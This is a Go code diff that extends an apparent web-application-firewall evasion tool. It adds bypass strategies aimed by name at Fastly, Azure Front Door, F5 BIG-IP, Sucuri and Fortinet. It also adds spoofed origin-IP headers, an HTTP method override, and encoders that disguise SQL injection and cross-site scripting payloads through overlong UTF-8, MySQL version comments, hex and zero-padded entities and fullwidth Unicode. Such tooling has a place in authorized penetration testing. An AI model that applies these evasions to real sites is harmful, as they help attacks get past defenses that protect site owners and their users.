@@ -39,6 +39,21 @@ var vendorStrategies = map[string][]Strategy{
 		{ID: "imperva_timing", Vendor: "Imperva", Name: "timing_evasion", Encodings: []string{"url"}, Protocol: []string{"timing_jitter"}, Description: "Timing jitter between fragments"},
 		{ID: "imperva_unicode", Vendor: "Imperva", Name: "unicode_overlong", Encodings: []string{"unicode", "double_url"}, Protocol: []string{}, Description: "Unicode overlong encoding"},
 	},
+	"fastly": {
+		{ID: "fastly_header_override", Vendor: "Fastly", Name: "header_override", Encodings: []string{"url"}, Protocol: []string{"origin_spoofing"}, Description: "Origin IP header bypass"},
+	},
+	"azure front door": {
+		{ID: "azure_path_pollution", Vendor: "Azure Front Door", Name: "path_pollution", Encodings: []string{"url", "double_url"}, Protocol: []string{"method_override"}, Description: "Method override and double URL encoding"},
+	},
+	"f5 big-ip": {
+		{ID: "f5_tab_whitespace", Vendor: "F5 BIG-IP", Name: "tab_whitespace", Encodings: []string{"tab_whitespace", "url"}, Protocol: []string{"chunked"}, Description: "Tab whitespace with chunked transfer"},
+	},
+	"sucuri": {
+		{ID: "sucuri_comment_mutate", Vendor: "Sucuri", Name: "mysql_version_comment", Encodings: []string{"mysql_version_comment"}, Protocol: []string{"origin_spoofing"}, Description: "MySQL version comment and IP masquerade"},
+	},
+	"fortinet": {
+		{ID: "forti_json_unicode", Vendor: "Fortinet", Name: "json_unicode", Encodings: []string{"json_unicode"}, Protocol: []string{"content_type_swap"}, Description: "JSON unicode escaping"},
+	},
 }
 
 type LearningProfile struct {
@@ -172,6 +187,12 @@ func ApplyStrategy(payload string, strategy Strategy) (string, map[string]string
 			out = fragmentPayload(out)
 		case "comment_injection":
 			out = strings.ReplaceAll(out, " ", "/**/")
+		case "origin_spoofing":
+			headers["X-Forwarded-For"] = "127.0.0.1"
+			headers["X-Originating-IP"] = "127.0.0.1"
+			headers["X-Real-IP"] = "127.0.0.1"
+		case "method_override":
+			headers["X-HTTP-Method-Override"] = "POST"
 		}
 	}
 	out = MutatePayload(out)
@@ -184,19 +205,80 @@ func ApplyEncoding(s, enc string) string {
 		return url.QueryEscape(s)
 	case "double_url":
 		return url.QueryEscape(url.QueryEscape(s))
+	case "selective_url":
+		r := strings.ReplaceAll(s, " ", "%20")
+		r = strings.ReplaceAll(r, "'", "%27")
+		r = strings.ReplaceAll(r, `"`, "%22")
+		r = strings.ReplaceAll(r, "<", "%3c")
+		r = strings.ReplaceAll(r, ">", "%3e")
+		r = strings.ReplaceAll(r, "(", "%28")
+		r = strings.ReplaceAll(r, ")", "%29")
+		r = strings.ReplaceAll(r, ";", "%3b")
+		return r
+	case "overlong_utf8":
+		r := strings.ReplaceAll(s, "/", "%c0%af")
+		r = strings.ReplaceAll(r, ".", "%c0%ae")
+		r = strings.ReplaceAll(r, "'", "%c0%a7")
+		r = strings.ReplaceAll(r, "<", "%c0%bc")
+		r = strings.ReplaceAll(r, ">", "%c0%be")
+		return r
 	case "unicode":
 		return unicodeEscape(s)
 	case "html_entity":
 		return htmlEntityEncode(s)
+	case "hex_html_entity":
+		r := strings.ReplaceAll(s, "<", "&#x3c;")
+		r = strings.ReplaceAll(r, ">", "&#x3e;")
+		r = strings.ReplaceAll(r, "'", "&#x27;")
+		r = strings.ReplaceAll(r, `"`, "&#x22;")
+		r = strings.ReplaceAll(r, "/", "&#x2f;")
+		return r
+	case "zero_padded_entity":
+		r := strings.ReplaceAll(s, "<", "&#0000060;")
+		r = strings.ReplaceAll(r, ">", "&#0000062;")
+		r = strings.ReplaceAll(r, "'", "&#0000039;")
+		r = strings.ReplaceAll(r, `"`, "&#0000034;")
+		return r
+	case "js_hex_escape":
+		r := strings.ReplaceAll(s, "'", `\x27`)
+		r = strings.ReplaceAll(r, `"`, `\x22`)
+		r = strings.ReplaceAll(r, "<", `\x3c`)
+		r = strings.ReplaceAll(r, ">", `\x3e`)
+		return r
 	case "hex":
 		return hexEncode(s)
 	case "octal":
 		return octalEncode(s)
+	case "tab_whitespace":
+		return strings.ReplaceAll(s, " ", "%09")
+	case "newline_whitespace":
+		return strings.ReplaceAll(s, " ", "%0a")
+	case "json_unicode":
+		r := strings.ReplaceAll(s, "'", `\u0027`)
+		r = strings.ReplaceAll(r, `"`, `\u0022`)
+		r = strings.ReplaceAll(r, "<", `\u003c`)
+		r = strings.ReplaceAll(r, ">", `\u003e`)
+		return r
+	case "mysql_version_comment":
+		r := strings.ReplaceAll(s, "SELECT", "/*!50000SELECT*/")
+		r = strings.ReplaceAll(r, "UNION", "/*!50000UNION*/")
+		r = strings.ReplaceAll(r, "FROM", "/*!50000FROM*/")
+		r = strings.ReplaceAll(r, "WHERE", "/*!50000WHERE*/")
+		return r
 	case "mixed":
 		if len(s) == 0 {
 			return s
 		}
 		return url.QueryEscape(string(s[0])) + htmlEntityEncode(s[1:])
+	case "unicode_nfkc":
+		r := strings.ReplaceAll(s, "<", "\uff1c")
+		r = strings.ReplaceAll(r, ">", "\uff1e")
+		r = strings.ReplaceAll(r, "'", "\uff07")
+		r = strings.ReplaceAll(r, `"`, "\uff02")
+		r = strings.ReplaceAll(r, "(", "\uff08")
+		r = strings.ReplaceAll(r, ")", "\uff09")
+		r = strings.ReplaceAll(r, "/", "\uff0f")
+		return r
 	default:
 		return s
 	}
